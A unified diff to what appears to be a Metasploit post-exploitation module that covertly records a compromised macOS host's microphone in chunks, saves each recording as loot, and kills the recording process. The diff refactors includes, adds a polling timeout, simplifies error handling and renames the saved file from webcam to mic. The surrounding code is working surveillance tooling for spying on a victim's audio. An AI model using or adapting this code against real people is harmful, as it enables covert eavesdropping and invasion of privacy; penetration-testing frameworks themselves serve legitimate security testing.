@@ -7,14 +7,15 @@
 
 require 'msf/core'
 require 'shellwords'
-require File.join(Msf::Config.install_root, "lib", "osx_ruby_ld_helpers")
-
+require 'msf/core/post/osx/ruby_dl'
 
 class Metasploit3 < Msf::Post
-	include ::Msf::Post::Common
-	include ::Msf::Post::File
+	include Msf::Post::Common
+	include Msf::Post::File
 	include Msf::Auxiliary::Report
-	include OSXRubyDLHelpers
+	include Msf::Post::OSX::RubyDL
+
+	POLL_TIMEOUT = 120
 
 	def initialize(info={})
 		super(update_info(info,
@@ -50,8 +51,8 @@ class Metasploit3 < Msf::Post
 
 
 	def run
-		fail_with(Exploit::Failure::Unknown, "Invalid session ID selected.") if client.nil?
-		fail_with(Exploit::Failure::Unknown, "Invalid action") if action.nil?
+		fail_with("Invalid session ID selected.") if client.nil?
+		fail_with("Invalid action") if action.nil?
 
 		num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
 		tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
@@ -83,7 +84,7 @@ class Metasploit3 < Msf::Post
 				Rex.sleep(datastore['SYNC_WAIT'])
 				# start reading for file
 				begin
-					::Timeout.timeout(120) do
+					::Timeout.timeout(poll_timeout) do
 						while true
 							if File.exist?(tmp_file)
 								# read file
@@ -98,7 +99,7 @@ class Metasploit3 < Msf::Post
 								# store contents in file
 								title = "OSX Mic Recording "+i.to_s
 								f = store_loot(title, "audio/quicktime", session, contents, 
-									"osx_webcam_rec#{i}.qt", title)
+									"osx_mic_rec#{i}.qt", title)
 								print_good "Record file captured and saved to #{f}"
 								print_status "Rolling record file. "
 								break
@@ -108,8 +109,7 @@ class Metasploit3 < Msf::Post
 						end
 					end
 				rescue ::Timeout::Error
-					fail_with(Exploit::Failure::Unknown, 
-						"Client did not respond to new file request, exiting.")
+					fail_with("Client did not respond to file request after #{poll_timeout}s, exiting.")
 				end
 			end
 		end
@@ -124,5 +124,9 @@ class Metasploit3 < Msf::Post
 			cmd_exec("/bin/kill -9 #{@pid}")
 		end
 	end
-end
 
+	private
+
+	def poll_timeout; POLL_TIMEOUT; end
+	def fail_with(msg); raise msg; end
+end
